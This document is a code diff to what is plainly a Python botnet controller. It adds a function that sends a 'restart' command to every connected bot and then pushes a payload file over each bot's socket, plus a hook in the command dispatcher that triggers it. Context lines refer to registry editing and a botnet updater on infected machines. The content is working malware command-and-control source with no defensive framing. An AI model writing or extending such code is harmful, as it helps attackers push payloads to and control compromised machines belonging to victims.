@@ -5,6 +5,9 @@ from time import sleep
 import sys
 import os
 
+if(len(sys.argv) > 1):
+    payload_name = str(sys.argv[1])
+
 botnet = {} #Botnet dictionary
 exec_command = "null"
 on_connect_exit = False
@@ -156,10 +159,32 @@ def edit_registry():
         elif(resp == "FAILED"):
             print("[*] Failed to edit registry on %s"%(bot))
 
+def reboot_botnet():
+    global botnet,payload_name
+    for bot in botnet:
+        try:
+            print("[*] Rebooting : %s"%(bot))
+            botnet[bot].send("restart".encode())
+            file = open(payload_name,'rb')
+            data = file.read()
+            botnet[bot].send(data)
+            file.close()
+            print("[*] Payload sent to : %s"%(bot))
+            resp = botnet[bot].recv(1024).decode()
+            if(resp == "DONE"):
+                print("[*] Bot %s rebooted"%(bot))
+        except socket.error:
+            print("[*] %s : Dead"%(bot))
+        except:
+            print("[*] Failed to reboot %s"%(bot))
 
 def process_cmd(cmd):
         global botnet
         sleep(1)
+
+        if "restart" in cmd:
+            reboot_botnet()
+
         if "updater" in cmd:
             updater_thread = Thread(target=update_botnet,args=())
             updater_thread.start()
